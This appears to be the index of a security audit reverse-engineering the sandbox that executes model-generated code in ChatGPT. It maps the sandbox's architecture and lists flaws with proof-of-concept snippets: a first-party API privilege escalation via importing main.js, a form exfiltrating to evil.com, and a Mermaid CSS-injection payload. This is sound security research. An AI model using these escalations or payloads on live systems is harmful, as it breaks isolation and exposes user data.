# Skybridge — индекс документации

**Что это:** полный реверс-инжиниринг `web-sandbox.oaiusercontent.com` —
песочницы **ChatGPT App Blocks** (Skybridge).

**Когда:** 2–3 ноября 2026. Бандлы скачаны с
`https://web-sandbox.oaiusercontent.com/assets/`.

**Объём:** 23 документа, ~25 000 строк, ~870 КБ.

---

# 1. Быстрый старт

## 1.1 Что такое Skybridge

**Skybridge** — песочница, в которой ChatGPT исполняет код, сгенерированный
моделью (React, Python, Three.js, HTML) и сторонние **App Blocks** (MCP Apps).

```
┌──────────────────────────────────────────────────────────────┐
│ chatgpt.com (top)                                            │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ web-sandbox.oaiusercontent.com (parent)                │  │
│  │  ┌──────────────────────────────────────────────────┐  │  │
│  │  │ iframe#root  sandbox="allow-scripts              │  │  │
│  │  │                      allow-same-origin           │  │  │
│  │  │                      allow-popups ...            │  │  │
│  │  │                      allow-forms"                │  │  │
│  │  │                                                   │  │  │
│  │  │  window.openai = window.oai = window.webplus      │  │  │
│  │  │  document.write(html)                             │  │  │
│  │  └──────────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

## 1.2 Три пути исполнения

| Путь | Кто | Что запускает |
|---|---|---|
| **`runUserCode`** | чат (код от модели) | react, recharts, python, html, threejs |
| **`runWidgetCode`** | App Block (MCP App) | только HTML |
| **`runComponent`** | внутренний | готовый React-компонент |

**`isFirstParty`** — ключевой флаг:
- `runUserCode` → **жёстко `false`** (публичный API)
- `runWidgetCode` → **параметр** (first-party получает 31 скрытый метод)

---

# 2. Карта документов

## 2.1 Ядро

| # | Файл | Размер | Документ |
|---|---|---|---|
| 1 | `main-BR1bOQyH.js` | 89 639 | **`01-main.md`** (2 047 строк) |
| 2 | `apply-csp-_9OvJz9C.js` | 5 121 | **`06-apply-csp.md`** (1 133) |
| 3 | `get-html-D9pLuxCy.js` | 502 | `05-...` |
| 4 | `parse-transpile-error-CaCAx2Mb.js` | 846 | `05-...` |
| 5 | `build-user-code-BQgOUc-V.js` | 1 340 | `05-...` |
| 6 | `validate-react-ByR8Hv0v.js` | 682 | `07-...` |

## 2.2 Раннеры

| # | Файл | Размер | Документ |
|---|---|---|---|
| 7 | `run-user-code-BcXlYlun.js` | 2 590 | **`04-run-user-code.md`** (932) |
| 8 | `run-widget-code-RkUxf2Ko.js` | 3 455 | **`10-run-widget-code.md`** (1 039) |
| 9 | `run-react-vAjeCFay.js` | 15 487 | **`07-...`** (1 418) |
| 10 | `run-recharts-CQOvWM4G.js` | 57 519 | **`09-run-recharts.md`** (1 131) |
| 11 | `run-three-BJvPLrbj.js` | 3 877 | `07-...` |

## 2.3 Окружение

| # | Файл | Размер | Документ |
|---|---|---|---|
| 12 | `transpile-Cld0n4VL.js` | 3 544 292 | **`12-transpile.md`** (1 634) |
| 13 | `prepare-environment-DVxA1AjJ.js` | 1 674 | **`08-...`** (1 361) |
| 14 | `python-worker-Y5Z0ImDG.js` | 4 841 | `08-...` |
| 15 | `pyodide-CAuAWlEr.js` | 13 967 | `08-...` |
| 16 | `tailwindcss_oxide-D8b55HqX.js` | 6 058 | **`20-tailwindcss-oxide.md`** (901) |

## 2.4 MCP Apps

| # | Файл | Размер | Документ |
|---|---|---|---|
| 17 | `adapter-CQcBVlDI.js` | 119 651 | **`11-adapter-mcp-apps.md`** (1 157) |

## 2.5 Библиотеки

| # | Файл | Размер | Документ |
|---|---|---|---|
| 18 | `client-BjybnHiv.js` | 208 365 | **`16-react-dom-client.md`** (920) |
| 19 | `index-C0fqnZRQ.js` | 8 470 | **`21-react-core.md`** (796) |
| 20 | `events-*.esm` | 159 828 | **`15-react-three-fiber.md`** (1 833) |
| 21 | `index-BTTCYQt9.js` | 1 617 880 | **`22-drei.md`** (808) |
| 22 | `vision_bundle-CPRQl8Yc.js` | 131 944 | **`18-mediapipe-vision.md`** (1 034) |
| 23 | `render-X3XFXER2-*.js` | 1 454 844 | **`17-elk-layout.md`** (1 239) |
| 24 | `render-mermaid-svg-CkMiccpV.js` | 10 200 | **`13-render-mermaid-svg.md`** (1 530) |
| 25 | `transform-4I4J0RKg.js` | 37 571 | **`19-d3-subset.md`** (1 090) |
| 26 | `index-hL9okClV.js` | 24 923 | **`14-modern-screenshot.md`** (928) |
| 27 | `__vite-browser-external` | 31 | **`23-small-files.md`** (384) |
| 28 | `main-foMHhJws.css` | 510 | `23-...` |

**Мелкие дубликаты:** `theme.css` / `utilities.css` (215 Б) — это XML-ошибки
Azure, не часть Skybridge (см. `23-...`).

---

# 3. Поток выполнения

## 3.1 React-виджет

```
Хост (ChatGPT)
 │
 └─ runUserCode({language: "react", code, id, csp})
     │
     ├─ applyCsp(csp)                      [06]
     │    ├─ ослабление → throw "CSP is being loosened"
     │    └─ иначе применяет <meta>
     │
     ├─ yield RUN_START
     │
     ├─ hn({isFirstParty: false})           [01]
     │    └─ 8 методов из `ao` + whitelist
     │
     ├─ _t(import run-react, deps)          [04]
     │
     └─ yield* runReact()                   [07]
         │
         ├─ ENVIRONMENT_STATUS INITIALIZING
         ├─ ENVIRONMENT_STATUS INSTALLING_PACKAGES
         │
         ├─ transpileReact()                [12]
         │    ├─ esbuild-wasm 0.24.2 (jsdelivr → unpkg)
         │    ├─ babel.transform() — TSX → AST
         │    │    ├─ hGe: data-source-name/pos на каждом JSX
         │    │    ├─ bGe: lucide → deep-import
         │    │    └─ FGe: удалить components/shadcn/ui
         │    ├─ wGe: 46 shadcn-компонентов
         │    ├─ jGe: обёртка (createRoot + data-ready/data-fatal)
         │    ├─ fJe: Tailwind WASM (1.64 МБ) в мьютексе
         │    └─ esbuild.context().rebuild() → bundle.js
         │
         ├─ getHtml({transpiledCode, css})   [05]
         │    └─ маркеры <!-- EXTRA_STYLES --> / <!-- TRANSPILED_CODE -->
         │
         ├─ Qe() — трансформер sourcemap (двойной: esbuild → babel)
         │
         └─ runHTMLAsync()                   [01]
             ├─ createElement("iframe") sandbox=...
             ├─ document.open() → Xt() глобалы → document.write()
             ├─ oo() — защита навигации
             ├─ MutationObserver → data-ready
             └─ ENVIRONMENT_STATUS RUNNING_CODE
```

## 3.2 Python-виджет

```
runUserCode({language: "python", code})
 │
 └─ runPythonInWorker(code, logger, onMessage)   [08]
     │
     ├─ Lt ??= new Worker(blob)     ← ОДИН воркер на всё
     ├─ worker.postMessage({code})
     │
     └─ [python-worker.js]
         ├─ INITIALIZING
         ├─ loadPyodide({indexURL: "cdn.jsdelivr.net/pyodide/v0.26.4/full"})
         │    └─ ~20 МБ (asm.js + wasm + stdlib.zip)
         ├─ globals = pyodide.globals.get("dict")()   ← НОВЫЙ каждый раз
         ├─ reformat_exception()
         ├─ перехват print → "N | text"
         ├─ INSTALLING_PACKAGES
         │    ├─ find_imports() — статический анализ
         │    ├─ loadPackagesFromImports() — из lock
         │    └─ micropip.install() с try/except: pass
         ├─ RUNNING_CODE
         ├─ matplotlib.use("AGG") если "matplotlib" в коде
         ├─ await runPythonAsync(code, {globals})
         └─ RUN_COMPLETE
```

## 3.3 MCP App (виджет)

```
runWidgetCode({html, isFirstParty, mcpApps, ...})   [10]
 │
 ├─ applyCsp(csp)
 ├─ (mcpApps || disableExternalNavigation) && resetPreview()
 ├─ prepareWidgetDocument ← hn({isFirstParty:true, includePrivate:true})
 ├─ globals = hn({isFirstParty, includePrivate: false, ...})
 ├─ appInitialization = mcpApps?.requiresInitialization
 │                       ? Promise.withResolvers() : undefined
 │
 └─ runHTMLAsync({..., onIframeReady})
     └─ onIframeReady({viewWindow, document})
         ├─ autofillObserver (если disableExternalNavigation)
         ├─ surfaceBackground (если mcpApps.globalSurface)
         └─ initMcpAppsAdapter({...})           [11]
             ├─ App (ju) + Transport (Hu)
             ├─ перехват ui/initialize → p.initializeMcpApp()
             ├─ блокировка host-context-changed до initialized
             └─ 17 UI-методов + 22 MCP через callMcp
```

---

# 4. Host API — полная карта

## 4.1 Три уровня доступа

```js
hn({isFirstParty, includePrivate, hostHandlesFollowUpMessageAuthorization})
```

| `isFirstParty` | `includePrivate` | `prepareWidgetDocument` | 31 из `Jr` | 8 из `ao` |
|---|---|---|---|---|
| `false` | `false` | ❌ | ❌ | ✅ (проверка жеста) |
| `true` | `false` | ❌ | ✅ | ✅ (без проверки) |
| `false` | `true` | ✅ | ✅ | ✅ (проверка) |
| `true` | `true` | ✅ | ✅ | ✅ (без проверки) |

## 4.2 31 скрытый метод (`Jr`)

```
scanCard                  sendInstrument
notifySecurityPolicyViolation  notifyEnvironmentError
notifyIntrinsicHeight     notifyBackgroundColor
notifyNavigation          notifyEscapeKey
notifyAppBlockMessage     notifyAutofillCandidates
drawBoundingBoxes         getDownloadURL
openExternalForm          openPromptInput
openConversationOverlay   openPulseOverlay
openPulseShare            openPlaidLink
openAppleHealthSettings   ensureAppleHealthOnboarding
requestAppleHealthPermissions  shouldRequestAppleHealthPermissions
showToast                 triggerHaptic
updateWidgetState         callMcp
initializeMcpApp          requestConnectPlugin
requestReconnectConnector requestDeclinePluginSuggestions
requestOpenPlugin
```

## 4.3 8 методов с user gesture (`ao`)

```
requestDisplayMode  sendFollowUpMessage  openExternal  openExternalForm
openPlaidLink       requestPrompt        requestTargetedReply  triggerHaptic
```

**Проверка:** `navigator.userActivation.isActive` → иначе `console.warn`
и метод **не вызывается**.

## 4.4 Три глобала — один объект

```js
window.oai === window.openai === window.webplus
```

**События:** `openai:set_globals` (новое) + `webplus:set_globals` (legacy).

---

# 5. MCP Apps — протокол

## 5.1 Версия

```js
var bo = "2026-01-26", Ou = [bo];   // единственная поддерживаемая
```

## 5.2 39 методов

**17 UI-методов:**

| Запросы | Уведомления |
|---|---|
| `ui/initialize` | `ui/notifications/initialized` |
| `ui/message` | `ui/notifications/host-context-changed` |
| `ui/update-model-context` | `ui/notifications/size-changed` |
| `ui/open-link` | `ui/notifications/tool-input` |
| `ui/request-display-mode` | `ui/notifications/tool-input-partial` |
| `ui/download-file` | `ui/notifications/tool-result` |
| `ui/resource-teardown` | `ui/notifications/tool-cancelled` |
| | `ui/notifications/sandbox-proxy-ready` |
| | `ui/notifications/sandbox-resource-ready` |
| | `ui/notifications/request-teardown` |

**22 MCP-метода:** `tools/call`, `tools/list`, `resources/list`,
`resources/read`, `resources/templates/list`, `resources/subscribe`,
`resources/unsubscribe`, `prompts/list`, `prompts/get`, `ping`,
`roots/list`, `elicitation/create`, `notifications/*` (9 типов).

## 5.3 CSP-схема MCP App

```js
{
  connectDomains: string[]   → connect-src
  resourceDomains: string[]  → img-src, script-src, style-src, font-src, media-src
  frameDomains: string[]     → frame-src
  baseUriDomains: string[]   → base-uri
}
```

**Плюс Permissions Policy:** `camera`, `microphone`, `geolocation`,
`clipboardWrite`.

---

# 6. Все находки — сводка

## 6.1 Критические

### C-01. Виджет может импортировать `main.js` и получить 31 приватный метод

**Файл:** `01-main.md`, раздел 18.1

```js
const m = await import("https://web-sandbox.oaiusercontent.com/assets/main-BR1bOQyH.js");
const api = m.g({isFirstParty: true, includePrivate: true});
// → callMcp, scanCard, openPlaidLink, updateWidgetState, ...
```

**Условие:** `sandbox="allow-scripts allow-same-origin"` + CSP `script-src 'self'`.

**Обход всех ограничений** `runUserCode`.

### C-02. `allow-scripts` + `allow-same-origin` = песочница неэффективна

**Файл:** `01-main.md`, раздел 18.1

```js
r.sandbox = "allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox allow-forms";
```

iframe того же origin, что и родитель. `parentSameOrigin: true` (из дампа).

**Даёт:** `parent.document`, `parent.localStorage`, `parent.fetch`.

### C-03. Любой npm-пакет исполняется с jsdelivr

**Файл:** `12-transpile.md`, раздел 7.1

```js
x.onResolve({filter: /^[^./]/}, ({path: D}) => {
  return {path: RB(`${Eee}/npm/${Aee(D)}/+esm`), namespace: "external"}
});
```

`import x from "любой-пакет"` → загрузка и исполнение. CSP разрешает
`cdn.jsdelivr.net`.

### C-04. `@radix-ui/*` без пина версии → `@latest`

**Файл:** `12-transpile.md`, раздел 7.2

```js
yGe = {react, "react-dom", recharts, three, "@react-three/fiber", "@react-three/drei"}
```

**33 вхождения `@radix-ui`** в shadcn-компонентах — не в списке.

---

## 6.2 Высокие

### H-01. `form-action` отсутствует + `allow-forms` по умолчанию

**Файл:** `06-apply-csp.md`, раздел 8.3

```html
<form action="https://evil.com/collect" method="POST">
```
CSP не блокирует, `connect-src` на form-submit не действует.

### H-02. Утечка через `<form>` не требует user gesture на навигацию

`o()` патчит `submit` и `HTMLFormElement.prototype.submit`, но если
`openExternalForm` нет — `fe()` только для GET; POST-данные не передаются,
но форма уходит.

### H-03. `themeCSS` в Mermaid — CSS-инъекция

**Файл:** `13-render-mermaid-svg.md`, раздел 11.12

```js
fill: ${t?.flowchartTextColor ?? t?.nodeTextColor ?? "currentColor"};
```

`flowchartTextColor: "red } * { display: none } .x {"` → инъекция.

### H-04. `b()` в Mermaid не проверяет frontmatter

**Файл:** `13-render-mermaid-svg.md`, раздел 11.11

```js
W = /%%\{[\s\S]*?\}%%/g      // только директивы
```

`---\nconfig:\n  securityLevel: loose\n---` → не проверяется.

### H-05. `storage.googleapis.com` вне CSP

**Файл:** `22-drei.md`, раздел 10.3

`<FaceLandmarker>` грузит модель с `storage.googleapis.com` — не в
базовом списке `apply-csp`.

### H-06. `drei-assets@master` без пина

**Файл:** `22-drei.md`, раздел 10.1

```js
const lE = "https://cdn.jsdelivr.net/gh/pmndrs/drei-assets@master";
```

### H-07. `openExternal` без проверки схемы URL

**Файл:** `11-adapter-mcp-apps.md`, раздел 11.1

```js
g.onopenlink = async ({url: m}) => p.openExternal({href: m})
```
`javascript:`, `file://`, `intent://` пройдут.

### H-08. `tools/list` в обход `forwardedRequestMethods`

**Файл:** `11-adapter-mcp-apps.md`, раздел 11.8

```js
if (m.method === "tools/list") return await b("tools/list", m.params);
```

---

## 6.3 Средние

### M-01. Двойной `RUN_COMPLETE` в `run-react`

**Файл:** `07-runners-react-three-validate.md`, раздел 6.1

```js
} catch (T) {
  yield {type: Ce.RUN_COMPLETE, ...};   // ← нет return
}
if (_ == null) { yield {type: Ce.RUN_COMPLETE, ...}; }  // второй раз
```

### M-02. `disableMutationObserver` ломает `data-fatal`

**Файл:** `10-run-widget-code.md`, раздел 10.2

```js
disableMutationObserver: !L && o && !I
```
При first-party + не ждём сигнал + не меряем ширину — observer отключён,
`data-fatal` не ловится.

### M-03. `resetPreview()` сносит все виджеты

**Файл:** `10-run-widget-code.md`, раздел 10.6

```js
(e || d) && X();   // X = resetPreview → удаляет ВСЕ iframe#root
```

### M-04. Автозаполнение только при `disableExternalNavigation`

**Файл:** `10-run-widget-code.md`, раздел 10.5

```js
const r = d ? A({document: c, viewWindow: l}) : void 0
```
Обычный режим (форма заказа) — не отслеживается.

### M-05. `catch {}` вокруг сборки глобалов

**Файл:** `10-run-widget-code.md`, раздел 10.1, `04-run-user-code.md` 6.2

Молчаливое падение — виджет без `window.openai`.

### M-06. Python: `try/except: pass` при micropip

**Файл:** `08-prepare-env-python-worker.md`, раздел 2.12

Ошибка установки пакета — молча.

### M-07. Python: PyProxy в `OUTPUT` → `DataCloneError`

**Файл:** `08-...`, раздел 2.13

```js
i !== void 0 && l({type: c.OUTPUT, output: i})
```
`i` — PyProxy, `postMessage` не клонирует.

### M-08. Python: случайное имя может стать невалидным

**Файл:** `08-...`, раздел 2.8

```js
`image_bytes_list_${Math.random().toString().split(".")[1]}`
```
`1.234e-7` → `"234e-7"` → невалидный идентификатор.

### M-09. Python: параллельный запуск ломает воркер

**Файл:** `04-run-user-code.md`, раздел 6.3

```js
s.onmessage = h;   // ← перезаписывает
```
Два вызова одновременно — первый промис висит вечно.

### M-10. `prepareEnvironment` — глобальный замок

**Файл:** `08-...`, раздел 1.3

```js
let a = !1;
if (!a) { a = !0; ... }
```
Второй параллельный вызов молча отбрасывается.

### M-11. `prepareEnvironment` для threejs бесполезен

**Файл:** `08-...`, раздел 1.6

Грузит вшитые бандлы, а `runThree` — unpkg через importmap.

### M-12. `prepareEnvironment` для python отсутствует

**Файл:** `08-...`, раздел 1.7

`default: return`. Самый тяжёлый язык (~20 МБ) без прогрева.

### M-13. `hWe` — кэш отравляется после провала

**Файл:** `12-transpile.md`, раздел 2.2

```js
if (QD) return await QD;   // rejected-промис → сразу throw
```

### M-14. `La.css` теряется при переиспользовании `buildContext`

**Файл:** `12-transpile.md`, раздел 7.11

```js
} else { La.indexFile = U; La.sourceCode = D; La.css = [] }
```

### M-15. `three@0.172.0` в пинах vs `0.179.1` в `run-three`

**Файл:** `12-transpile.md`, раздел 7.12

### M-16. R3F 9.5.0 требует React 19, пиннинг — 18.3.1

**Файл:** `15-react-three-fiber.md`, раздел 14.1

```js
peerDependencies: {react: ">=19 <19.3"}
yGe = {react: "18.3.1", "@react-three/fiber": "8.17.7"}
```

### M-17. `form-action` + `allow-forms` (дубль H-01)

### M-18. `String.fromCharCode(...arr)` — переполнение стека

**Файл:** `14-modern-screenshot.md` 9.1, `18-mediapipe-vision.md` 12.1,
`19-d3-subset.md`

PNG > 65 КБ → `RangeError`.

### M-19. `WasmScanner` без `free()` — утечка

**Файл:** `20-tailwindcss-oxide.md`, раздел 11.2

### M-20. `const g = 0` — `.stack` всегда пустой

**Файл:** `20-tailwindcss-oxide.md`, раздел 10.1

### M-21. `@master` в drei-assets (дубль H-06)

---

## 6.4 Низкие (информационные)

| ID | Что | Документ |
|---|---|---|
| L-01 | `data-source-name`/`data-source-pos` на каждом JSX | `12` |
| L-02 | `.recharts-wrapper:focus{outline:none}` — a11y | `09` |
| L-03 | Локаль жёстко `en-US` в recharts | `09` |
| L-04 | `runtimeChartMeta` — недокументированный глобал | `09` |
| L-05 | `androidSkybridge`/`chatgpt` — классы без стилей | `23` |
| L-06 | `1.5 МБ` данных preset-env не используются | `12` |
| L-07 | `cache()` в React — заглушка | `21` |
| L-08 | `react.transitional.element` — смена в React 19 | `21` |
| L-09 | `bindFunctions` теряется в Mermaid | `13` |
| L-10 | `2048×2048` — обрезка больших диаграмм | `13` |
| L-11 | `ELK` синхронный, блокирует main thread | `17` |
| L-12 | `1.6 МБ` drei грузится целиком | `22` |
| L-13 | `pointer === mouse` в R3F | `15` |
| L-14 | 10 DOM-обработчиков навешиваются всегда | `15` |
| L-15 | `&` вместо `&&` в d3 `translate` | `19` |
| L-16 | `#abcde` проходит regex hex | `19` |

---

# 7. Ключевые числа

## 7.1 Размеры

| Файл | Размер |
|---|---|
| `transpile` | 3 544 292 |
| `index-BTTCYQt9` (drei) | 1 617 880 |
| `render` (ELK) | 1 454 844 |
| `client` (react-dom) | 208 365 |
| `events` (R3F) | 159 828 |
| `vision_bundle` | 131 944 |
| `adapter` (MCP) | 119 651 |
| `main` | 89 639 |
| `run-recharts` | 57 519 |
| `transform` (d3) | 37 571 |
| `index-hL9okClV` | 24 923 |
| `run-react` | 15 487 |
| `pyodide` | 13 967 |
| `render-mermaid-svg` | 10 200 |
| `index-C0fqnZRQ` (React) | 8 470 |
| `tailwindcss_oxide` | 6 058 |
| `apply-csp` | 5 121 |
| `python-worker` | 4 841 |
| `run-three` | 3 877 |
| `run-widget-code` | 3 455 |
| `run-user-code` | 2 590 |
| `prepare-environment` | 1 674 |
| `build-user-code` | 1 340 |
| `parse-transpile-error` | 846 |
| `validate-react` | 682 |
| `get-html` | 502 |
| `__vite-browser-external` | 31 |

**Всего JS:** ~7.8 МБ.

**Плюс WASM:**
- `tailwindcss_oxide_bg.wasm` — 1 721 212
- `esbuild.wasm` — ~1 МБ (с CDN)
- `pyodide` — ~20 МБ (с CDN)
- `vision_wasm_internal.wasm` — ~10 МБ (с CDN)

## 7.2 Константы

| Что | Значение |
|---|---|
| Версия протокола MCP | `2026-01-26` |
| esbuild-wasm | `0.24.2` |
| React | `18.3.1` (пиннинг) / `19.3.0-canary-7dc903cd-20251203` (вшит) |
| R3F | `9.5.0` (вшит) / `8.17.7` (пиннинг) |
| three | `0.172.0` (пиннинг) / `0.179.1` (run-three) |
| recharts | `3.8.1` |
| Pyodide | `0.26.4` |
| MediaPipe | `0.10.17` |
| shadcn-компонентов | 46 |
| Azure Blob доменов | 35 |
| Tаймаут `prepareDocument` | 10 с |
| Таймаут MCP init | 30 с |
| Задержка unmount R3F | 500 мс |
| Лимит `invalidate` R3F | 60 кадров |
| `spacing.baseValue` (ELK) | 40 / 30 |
| `smoothTime` FaceControls | 0.25 с |
| Размер рендер-контейнера Mermaid | 2048×2048 |

---

# 8. Что можно сделать

## 8.1 Проверить C-01 на практике

```js
// внутри iframe виджета
const m = await import("/assets/main-BR1bOQyH.js");
const api = m.g({isFirstParty: true, includePrivate: true});
console.log(Object.keys(api));   // ← должно быть 31+ метод
```

**Если работает** — эскалация подтверждена.

## 8.2 Проверить H-03 (CSS-инъекция в Mermaid)

```js
renderMermaidSvg({
  source: "flowchart TD\nA-->B",
  themeVariables: {flowchartTextColor: "red } * { display: none } .x { fill: blue"}
});
```

**Если диаграмма исчезнет** — инъекция работает.

## 8.3 Проверить H-05 (`storage.googleapis.com`)

```jsx
<FaceLandmarker>...</FaceLandmarker>
```
**Если модель не загрузится** — CSP блокирует.

## 8.4 Проверить M-01 (двойной `RUN_COMPLETE`)

Запустить React-виджет с синтаксической ошибкой → посчитать события
`RUN_COMPLETE`.

---

# 9. Структура файлов

```
/root/sandboxhunt/
 ├─ skybridge/                  ← 30 скачанных файлов (7.8 МБ)
 ├─ docs/                       ← 23 документа (эта папка)
 │   ├─ INDEX.md                ← вы здесь
 │   ├─ 01-main.md
 │   ├─ 04-run-user-code.md
 │   ├─ ...
 │   └─ 23-small-files.md
 ├─ docs_old/                   ← первые версии #1–#3 (конспекты)
 ├─ SKYBRIDGE_AUDIT.md          ← первый аудит (301 строка)
 └─ SKYBRIDGE_BRIDGE_MAP.md     ← карта моста
```

## 9.1 Порядок чтения

**Для понимания архитектуры:**
1. `01-main.md` — ядро, Host API, iframe, навигация
2. `04-run-user-code.md` — диспетчер языков
3. `07-runners-react-three-validate.md` — React-раннер
4. `12-transpile.md` — сборка
5. `06-apply-csp.md` — политика безопасности

**Для MCP Apps:**
1. `10-run-widget-code.md` — вход
2. `11-adapter-mcp-apps.md` — протокол

**Для Python:**
1. `08-prepare-env-python-worker.md` — всё

**Для библиотек:**
1. `15-react-three-fiber.md` — R3F
2. `22-drei.md` — drei
3. `16-react-dom-client.md` + `21-react-core.md` — React
4. `17-elk-layout.md` — ELK
5. `13-render-mermaid-svg.md` — Mermaid
6. `19-d3-subset.md` — D3
7. `18-mediapipe-vision.md` — MediaPipe
8. `14-modern-screenshot.md` — скриншоты
9. `20-tailwindcss-oxide.md` — Tailwind

---

# 10. Итог

**Skybridge — это слоёный пирог:**

```
Host API (31 метод, 3 уровня доступа)
    ↓
Раннеры (react / recharts / python / threejs / html)
    ↓
Транспиляция (babel + esbuild + tailwind WASM)
    ↓
HTML-документ (getHtml с маркерами)
    ↓
iframe (sandbox, но allow-same-origin)
    ↓
CSP (только ужесточение, 14 директив, без form-action)
```

**Самое слабое место:** `allow-scripts` + `allow-same-origin` +
возможность импортировать `main.js` из iframe → **любой виджет может
получить first-party API**.

**Самое странное:** `prepareEnvironment` не прогревает Python (самый
тяжёлый) и не помогает threejs (другой источник).

**Самое аккуратное:** `apply-csp` — ослабление невозможно
архитектурно, инъекция через `;` заблокирована.

**Самое рискованное:** `import x from "любой-npm-пакет"` →
`jsdelivr/npm/x/+esm` → исполнение.
